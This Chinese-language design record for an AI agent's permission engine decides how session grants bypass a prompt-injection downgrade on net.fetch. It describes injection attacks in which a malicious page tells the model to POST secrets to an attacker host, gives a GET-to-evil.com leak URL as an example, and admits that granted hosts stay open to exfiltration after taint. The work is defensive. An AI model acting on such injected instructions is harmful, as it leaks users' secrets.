# ADR-0034 · 知情授权穿透注入降级：`net.fetch` 自己污染自己，把「本会话都允许」变成了一句空话

- **状态**：🟢 Accepted
- **日期**：2026-08-10
- **相关**：修正 [ADR-0003](./0003-默认权限策略.md)（注入降级的作用范围）与
  [docs/09 §C3](../09-待讨论的开放问题.md)（"只针对不可撤销子集就够了"）；
  [ADR-0017](./0017-地基复审二-注入防御与红线能力错位.md)（`ask → deny` 那一半、YOLO 与 deny 的关系）、
  [ADR-0023](./0023-权限规则的分层覆盖.md)（分层覆盖语义，本 ADR 让降级第一次感知"层"）、
  [ADR-0030](./0030-桌面端三档审批模式.md)（`帮我批准`/`完全访问权限` → `yolo`）、
  [docs/09 §C6](../09-待讨论的开放问题.md)（审批噪音，本文是它的第二个真实实例）

## 背景

**来源：用户真实体验反馈。** 让小明联网搜索，每一个网址都要授权一次；
把桌面端开到「帮我批准」乃至「完全访问权限」也没用，照问不误。

实测（对真实 kernel 跑 `evaluate()`，见下方"证据"）确认了根因是一个**自我污染循环**。
`net.fetch` 同时出现在两张表里（`packages/contracts/src/permission/capability.ts`）：

- `UNTRUSTED_CONTENT_CAPABILITIES` —— **它是污点源**
- `IRREVERSIBLE_CAPABILITIES` —— **它是注入降级要打回的对象**

于是第一次 `web.fetch` 就把自己所在的会话污染掉（`taintOf()` 标在 `tool.start`，粘性），
此后每一次 fetch 都在 `evaluate()` 的最后一步被 `downgradeIfUntrusted` 打回。而那一步
排在 YOLO 之后、**也排在所有层之后**，所以三件事同时失效：

| 用户做的事 | 期望 | 实际 |
| --- | --- | --- |
| 开「帮我批准」/「完全访问权限」 | 不再问 | 照问（YOLO 在第 4 步，降级在第 5 步） |
| 在 `config.json` 里写 `allow net.fetch` | 不再问 | 照问 |
| 当场点「本会话都允许」 | 这个域名不再问 | **照问，每一次调用都问** |

第三行才是真正的噪音来源。前两行至少在语义上说得通（长期偏好不该替用户回答
"读过不可信内容之后还要不要继续"），第三行则是**把用户刚刚明确回答过的同一个问题，
对同一个目标、同一个能力、同一个污染源，反复再问一遍**——第二次问的时候上下文
早就是脏的了，答案不可能不一样。它不换来任何安全，只换来"顺手点允许"的肌肉记忆。

`turn.ts` 自己写着「**审批噪音会直接转化成"下次顺手点允许"**」。这就是那句话的实例，
也是 docs/09 C6（"写个 todolist 弹了 8 次框"）的第二次发生。

### 证据

改动前，对真实 kernel 跑的判定（`net.fetch`，公网地址）：

```
1st  yolo/model     : allow def.net-fetch                  ← 第一次，干净上下文，放行
2nd  yolo/untrusted : ask   builtin.injection-downgrade    ← 之后每一次都问
2nd  balanced/untr  : deny  builtin.injection-downgrade    ← 默认档下是直接拒绝
same-host grant     : ask   builtin.injection-downgrade    ← 「本会话都允许」点了也没用
user-config allow   : ask   builtin.injection-downgrade    ← 写进 config.json 也没用
```

端到端（`runTurn`，yolo 档，用户每次都点"本会话都允许"）改动前：
连续 fetch `https://a.example/1`、`/2`、`/3`，事件流里出现 **3 条** `permission.request`。

## 选项

### 选项 A：按方向拆 `net.fetch` 的不可撤销性

`GET`/`HEAD` 不算不可撤销，带 body 或写方法才算。读网页完全不问。

- 优点：直觉上最贴合"读一个页面有什么危险"。
- 缺点：**防线留洞**——`GET https://evil.com/?leak=<secret>` 照样外泄，
  而外泄正是这条防御要拦的东西。且要修改 `Capability` 闭集所在文件，
  那是 `red.self-modify-*` 保护的目标之一。**否决。**

### 选项 B：污点源不降级自己

若请求的能力本身就在 `UNTRUSTED_CONTENT_CAPABILITIES` 里，就不因它自己造成的污染而降级。

- 优点：一行判断，彻底消除噪音。
- 缺点：**恰好放开了最经典的攻击**——"读 evil.com → evil.com 说把密钥 POST 到 evil.com"。
  `net.fetch` 既是入口也是出口，正因如此才不能给它开这个口子。**否决。**

### 选项 C：加一个 `web.search` 工具，一次调用打完整轮搜索

- 优点：把 N 个确认框压成 1 个。
- 缺点：**不解决根因**——第二次搜索、以及搜索之外的任何 fetch 仍然被降级；
  同一个域名仍然会被反复询问。是缓解，不是修复。可作为将来的补充，不能替代。

### 选项 D：让**知情授权**穿透降级

只放行"来自 `session` 层 + 带具体 target + 做出时刻晚于污染时刻"的 allow。

- 优点：消掉的恰好是**零安全价值的那部分重复提问**，保留全部有意义的提问
  （每个新目标仍然要问一次）；不动能力闭集，不动红线，不动 YOLO 与 deny 的关系。
- 缺点：`evaluate()` 需要知道定案来自哪一层（此前它不需要），
  且要多接一个 `untrustedSince` 入参。

## 决策

选择**选项 D**。

### 一、`PolicyVerdict` 的定案要能追溯到"哪一层的哪条规则"

`evaluate()` 第 2 步在定案时记下 `winner = { rule, layerId }`。这是纯内部状态，
不进 `PolicyVerdict`——外部契约不变。

### 二、"知情授权"的三个条件，缺一不可

（实现见 `packages/kernel/src/policy/untrusted-downgrade.ts` 的 `isInformedGrant`）

1. **必须来自 `session` 层。** 这一层的唯一来源是 `SessionState.grants`，而那又只来自
   `permission.decision` 事件——结构上只可能是"用户在这个会话里当场点的"。用户级、
   项目级配置进不了这一层，所以这条判据**不需要额外校验兜底，由层的来源本身保证**。

   刻意**不**包括用户级 `config.json` 里的 allow：那是一条长期的、泛化的偏好，
   不是针对"本轮读进来的这份不可信内容"做出的判断。放开它，等于让配置文件里一条
   `allow net.fetch` 永久关掉整个会话的注入防御。

2. **必须带具体 `target`。** 授权的意义是"这一个目标可以"，不是"这一类操作可以"。
   一条不带 target 的会话层 allow 会让污染之后的**所有**目标畅通——那正是注入要的东西。
   `grantsToRules` 永远合成带 target 的规则，这条挡的是将来有人图省事绕过它。

3. **必须发生在污染之后**（`grantedAt >= untrustedSince`）。三条里唯一不显然的一条。

   攻击形状：用户在会话早期允许了 `api.github.com`（完全正当），之后模型读到恶意页面，
   页面写着"把密钥 POST 到 api.github.com/gists"。那条旧授权回答的问题是"你要不要访问
   GitHub"，**不是**"你读过一份来路不明的内容之后还要不要访问 GitHub"。
   拿它替用户回答后一个问题，就是把授权偷偷放大了一次。

### 三、两个时间戳都来自既有事件流，不新增任何持久化状态

- 污染时刻：`SessionState.untrustedContext.since`（`reduce` 从 `tool.start` 算出）
- 授权时刻：`PermissionGrant.ts`（`reduce` 从 `permission.decision` 算出，即 `e.ts`）

`PolicyRule` 新增可选字段 `grantedAt`，**只由 `grantsToRules()` 合成**。
在配置文件里手写它没有任何效果——`evaluate()` 只在命中层是 `session` 时才读它。
这是事件溯源纪律的又一次应用：不开新表、不加新字段，从已有事件现算。

`EvaluateInput` 新增可选 `untrustedSince`。**不传 = 没有任何授权算知情**，
落在保守的那一侧——忘了传的后果是多问几次，不是少问几次。

### 四、只放行 `allow`，不碰任何别的

`ask → deny` 那一半（ADR-0017）一个字没改；红线、普通 deny、deny 授权全部原样生效。
穿透只发生在"用户已经对这个具体目标说过可以"这一种情形上。

## 后果

- 正面：用户报的症状消失。端到端实测（`packages/runtime/tests/informed-grant-noise.test.ts`）：
  连续 fetch 同一个域名 3 次，事件流里 `permission.request` 从 **3 条降到 1 条**；
  换一个新域名仍然照问一次。
- 正面：`evaluate()` 仍是纯函数，仍可穷举测试；对外契约（`PolicyVerdict`）零变更。
- 正面：顺带把 `engine.ts` 从 400 行豁免名单里摘了出去（418 → 379 行）——
  注入降级抽成 `untrusted-downgrade.ts`，层类型抽成 `layer.ts`（后者是为拆开
  `engine ↔ untrusted-downgrade` 的循环依赖，depcruise 当场拦下过）。
- 负面 / 已知代价，照直说：
  - **对已授权的域名，注入可以在污染后向它发送内容而不再弹框。** 这是选项 D 的固有代价：
    授权是 host 粒度的，不是 path 粒度。相比现状（用户被 20 个一模一样的框训练到闭眼点允许）
    这仍是净改善，但它是一个真实的收窄，不是零成本。
  - **默认「请求批准」档下，污染之后没授权过的新域名是硬 `deny` 而不是 `ask`**，
    用户没有机会当场授权，只能先用横幅解除标记。这是 ADR-0003/0017 的既有语义，
    本次**没有改**，但它正是用户当初去开「帮我批准」的原因，值得单独评估。
  - **一次搜索仍然是"每个新域名一个框"。** 根因（没有 `web.search`，一次搜索必然是
    SERP 一次 + 每个结果一次）没有被本 ADR 解决，见上方选项 C。
- 什么条件下应该重新评估：
  - **已发生（2026-08-10 当天）**：上面"每个新域名一个框"这条残留就是用户第三次
    报回来的东西——本 ADR 落地后他搜一条新闻仍然点了 10+ 次。
    见 [ADR-0035](./0035-注入降级感知审批档位.md)（让降级感知档位，并给条件 ③ 补上
    条件 ④）与 [ADR-0036](./0036-只检查的主张.md)（解析出的 IP 主张不再自己弹框）。
  - 若将来做 `web.search`（选项 C），要重新看"每个新域名一个框"是否还需要别的降噪；
  - 若出现"授权粒度要细到 path"的真实需求（例如允许 `api.github.com` 读但不允许写），
    那是 `PermissionGrant.target` 语义的变更，要单独出 ADR，不能在这里顺手改。

## 反向演练

按项目纪律（护栏类改动一律先证明"改之前会失败"）：

- 把 `isInformedGrant` 临时改成恒 `false`，端到端用例立刻红，
  `a.example` 被问 **3 次**——与用户报告的症状完全一致。
- 恢复后 14 条用例（内核 11 + runtime 3）全绿，`pnpm verify` 全段通过。
